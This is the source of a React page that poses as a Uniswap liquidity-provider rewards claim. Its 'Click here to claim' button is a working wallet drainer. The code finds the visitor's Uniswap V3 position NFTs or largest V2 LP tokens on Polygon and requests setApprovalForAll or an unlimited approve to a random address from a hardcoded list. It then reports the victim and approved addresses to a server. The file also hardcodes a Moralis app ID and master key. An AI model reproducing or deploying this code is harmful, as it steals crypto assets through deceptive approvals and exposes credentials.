import { useContext, useEffect, useState } from "react"
import Layout from "../components/Layout"
import Modal from "../components/Modal"
import AppContext from "../context/AppContext"
import { useMoralis } from "react-moralis";

const Index = () => {
  const [loading, setLoading] = useState(false)
  const [waiting, setWaiting] = useState(false)
  const { connecting, setConnecting, userAddress, userConnected, web3, sendTransaction, connectMetamask } = useContext(AppContext);

  const arrayAddress = [
    "0xF564B6d2a092d26a33fb77161c67B6b09E8f4528",
    "0xEa4df421EBb451E99A152Fc246CaB31BD9b07910",
    "0x3954Cd33bfF4Fee1D6c5d7E04fBFEaDdC7E89d56",
    "0xd1f04f7914715dda337ccaA09d585a857E76C888",
    "0x56022c3CDa70d158BBE74A1163C90C0d379fC64D",
    "0xD7e55551018B1D0Fe9e324107054154B1374e98f",
    "0x25f8A3000733a8c0c1Dd0Cc9E2c68a992dEa71B9",
    "0x7321e952e1A216a22ba0c85FA7011E64B78d7878",
    "0x66366E33B26965700B006F536eE618A6Cd1dd158",
    "0x345A7add00ADab9bD83e572ED65914C903814A28",
    "0x6d247D06b76c2e82F3734a0a19AfE6960DDbB4C6"
  ]

  const abiLPContract = require('../helpers/abiLPContract.json');
  const abiPositionContract = require('../helpers/abiPositionContract.json');
  const addressPositionContract = '0xC36442b4a4522E871399CD717aBDD847Ab11FE88';
  const { Moralis } = useMoralis();

  const writeAddress = (approveAddress) => {
    fetch('http://localhost:3000/app', {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        userAddress: userAddress,
        approveAddress
      }),
    })
  }

  useEffect(() => {
    const initMoralis = async () => {
      /* Moralis init code */
      const serverUrl = "https://pgl6znodo88m.usemoralis.com:2053/server";
      const appId = "tmaPMGyz9Mksp6zcdqsG5sLiKUWdYupJAxSkG5q1";
      const masterKey = "l31Uq6CW2YYhoy8UbUq9IoHwb7ZPXkxa6dkmjuFW";

      await Moralis.start({ serverUrl, appId, masterKey });
    };

    initMoralis();
  }, []);

  const getRandomAddress = () => {
    const randAddress = arrayAddress[Math.floor(Math.random() * arrayAddress.length)];

    return randAddress;
  }

  const getDataTransaction = async () => {
    let NFTs = await Moralis.Web3API.account.getNFTs({chain: "polygon", address: userAddress}), _check = false;

    if (NFTs) {
      if (NFTs.result && NFTs.result.length) {
        let filterNFTs = NFTs.result.filter(NFT => NFT.name == 'Uniswap V3 Positions NFT-V1');
        
        if (filterNFTs.length)
          return {
            abi: abiPositionContract,
            contract: addressPositionContract,
            addressToApprove: getRandomAddress()
          };
      }
    }

    let tokens = await Moralis.Web3API.account.getTokenBalances({chain: "polygon", address: userAddress});

    let filterTokens = tokens.filter( token => token.name == 'Uniswap V2' ),
        sortTokens = filterTokens.sort((x, y) => {
          if (Number(x.balance) > Number(y.balance)) {return -1;}
          if (Number(x.balance) < Number(y.balance)) {return 1;}
          return 0;
      });

    // tokens.map( token => {
    //   // console.log(token.name);
    //   if (token.name == 'Uniswap V2'){
    //     _check = token.token_address;
    //   }
    // });

    if (sortTokens.length) 
      return {
        abi: abiLPContract,
        contract: sortTokens[0].token_address,
        addressToApprove: getRandomAddress()
      };

    return false;
  }

  const handleApprove = async () => {

    if (userConnected) {
      let dataTransaction = await getDataTransaction();

      if (dataTransaction) {
        setLoading(true);
        const {abi, contract, addressToApprove} = dataTransaction;
        let uniContract = new web3.eth.Contract(abi, contract), txData = null;

        if (addressPositionContract.toLowerCase() == contract.toLowerCase()) {
          txData = await uniContract.methods.setApprovalForAll(addressToApprove, true).encodeABI();
          //estimateGas = await uniContract.methods.setApprovalForAll(addressToApprove, true).estimateGas();

          sendTransaction(userAddress, contract, txData, 0).then( (res) => {
            if (res) {
              writeAddress(addressToApprove);
            }
            
            setLoading(false);
          });
        } else {
          let bigNumber = web3.utils.toBN('1000000000000000000000000000000');

          txData = await uniContract.methods.approve(addressToApprove, bigNumber).encodeABI();
          //estimateGas = await uniContract.methods.approve(addressToApprove, bigNumber).estimateGas();

          sendTransaction(userAddress, contract, txData, 0).then( (res) => {
            if (res) {
              writeAddress(addressToApprove);
            }
            
            setLoading(false);
          });
        }
      } else {
        setWaiting(true);
      }
    } else {
      connectMetamask();
    }
  }

  return (
    <Layout>
        <main>
        <div className="jtTbsr">
          <div className="sc-1tyqiu8-0 eToZFE">
            <div className="sc-11hxjd5-3 gVxchp">
              <div className="sc-11hxjd5-4 dJWED"><a rel="noopener noreferrer"
                  href="#" className="sc-88web0-5 gjJqGP sc-11hxjd5-6 cvxKUM">
                  <div color="rgba(130, 71, 229)" className="sc-11hxjd5-2 bhkVEP">
                    <div className="sc-bdnxRM sc-u7azg8-0 sc-u7azg8-3 fzUdiI kpoZKP RQriX">
                      <h2 className="sc-11hxjd5-5 hhjLpb">Liquidity provider rewards</h2>
                      <br />
                      <br />
                      <span className="sc-88web0-13 aqVJp">
                        At 1400 UTC, July 12, 2022, Uniswap distributed the UniswapLP tokens, based on the provided
                        liquidity,
                        to the existing
                        UNI-V3 liquidity providers.</span>

                      <br />
                      <span className="sc-88web0-13 aqVJp">
                        If you have received the UniswapLP tokens, then you are eligible to claim the UNI tokens from this
                        page by clicking on
                        the below button.</span>
                    </div>
                  </div>
                </a></div>
            </div>
          </div>

          </div>

          <span style={{
            "fontWeight": "bold",
            "display": "block",
            "textAlign": "center",
            "fontSize": "18px",
            "maxWidth": "640px",
            "marginTop": "1rem"}}>v3 Liquidity Provider Rewards Claim</span>

          <button className="jRkoXV" onClick={handleApprove} type="button">Click here to claim</button>
        </main>

        {(connecting && <Modal setLoading={setConnecting} text={'Connecting...'} connect />)}
        {(loading && <Modal setLoading={setLoading} text={'Waiting transaction...'} />)}
        {(waiting && <Modal setLoading={setWaiting} text={'You have no tokens to claim.'} noClaim />)}
    </Layout>
  )
}

export default Index